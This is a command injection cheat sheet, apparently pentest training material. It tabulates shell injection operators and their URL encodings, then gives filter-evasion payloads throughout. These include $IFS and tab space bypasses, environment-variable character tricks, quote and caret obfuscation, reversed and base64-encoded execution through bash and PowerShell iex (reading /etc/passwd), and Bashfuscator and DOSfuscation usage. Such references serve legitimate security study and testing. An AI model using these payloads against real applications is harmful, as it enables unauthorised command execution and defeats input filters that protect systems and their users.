# Command Injections Cheat Sheet

## Injection Operators
| Operator | Character | URL-Encoded | Executed Command | OS |
|---|---|---|---|---|
| Semicolon | `;` | `%3b` | Both | Linux / Windows (PS) |
| New Line | `\n` | `%0a` | Both | Both |
| Background | `&` | `%26` | Both (second output generally shown first) | Both |
| Pipe | `\|` | `%7c` | Both (only second output is shown) | Both |
| AND | `&&` | `%26%26` | Both (only if first succeeds) | Both |
| OR | `\|\|` | `%7c%7c` | Second (only if first fails) | Both |
| Sub-Shell | ` \` ` | `%60%60` | Both | Linux |
| Sub-Shell | `$()` | `%24%28%29` | Both | Linux |

## Filter Evasion
### Bypassing Space Filters
*   **Using Tabs:** Replace spaces with tabs (`%09`). Example: `127.0.0.1%0a%09whoami`
*   **Using `$IFS`:** Linux Environment Variable that defaults to space/tab. Example: `127.0.0.1%0a${IFS}whoami`
*   **Using Brace Expansion:** Bash automatically adds spaces. Example: `127.0.0.1%0a{ls,-la}`

### Bypassing Other Characters (Slashes/Semicolons)
#### Linux
*   **Environment Variables:** Use substring expansion on existing variables.
    *   `/` (Slash): `${PATH:0:1}` (Assuming first char of `$PATH` is `/`)
    *   `;` (Semicolon): `${LS_COLORS:10:1}` (Check `printenv` for variables containing `;`)
*   **Character Shifting:** Shift the ASCII value.
    *   `\` (Backslash): `$(tr '!-}' '"-~'<<<[)` (Shifts `[` to `\`)

#### Windows
*   **CMD Variables:** Echo variable with substring.
    *   `\` (Backslash): `echo %HOMEPATH:~6,-11%` (Adjust offsets based on username)
*   **PowerShell Arrays:** Access string index.
    *   `\` (Backslash): `$env:HOMEPATH[0]`

### Bypassing Command Blacklists
#### Quotes & Ignored Characters
*   **Linux & Windows (Quotes):** Insert single or double quotes (must be even, don't mix).
    *   `w'h'o'am'i`
    *   `w"h"o"am"i`
*   **Linux Only (Ignored Chars):** Insert `\` or `$@`.
    *   `who$@ami`
    *   `w\ho\am\i`
*   **Windows Only (Carets):** Insert `^`.
    *   `who^ami`

#### Advanced Obfuscation
*   **Case Manipulation:**
    *   **Windows:** CMD/PS are case-insensitive (`WhOaMi` works directly).
    *   **Linux (Bash):** Bash is case-sensitive. Use `tr` to lowercase the command.
        *   `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` (Replace spaces with tabs if needed: `$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")`)
*   **Reversed Commands:**
    *   **Linux:** Reverse the string (`imaohw`) and execute with sub-shell and `rev`.
        *   `$(rev<<<'imaohw')`
    *   **Windows (PS):** Reverse string and execute with `iex`.
        *   `iex "$('imaohw'[-1..-20] -join '')"`
*   **Encoded Commands:** Encode the payload (e.g., base64) to hide filtered characters, then decode and execute.
    *   **Linux:**
        *   Encode: `echo -n 'cat /etc/passwd | grep 33' | base64` -> `Y2F0IC...`
        *   Execute: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` (Avoids pipes)
    *   **Windows (PS):**
        *   Encode (UTF-16LE + Base64): `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` -> `dwBo...`
        *   Execute: `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

## Automated Evasion Tools
*   **Linux:** [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator)
    *   Usage: `./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`
*   **Windows:** [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation)
    *   Usage: Run `Invoke-DOSfuscation` in PowerShell, then interactively set command and encoding.
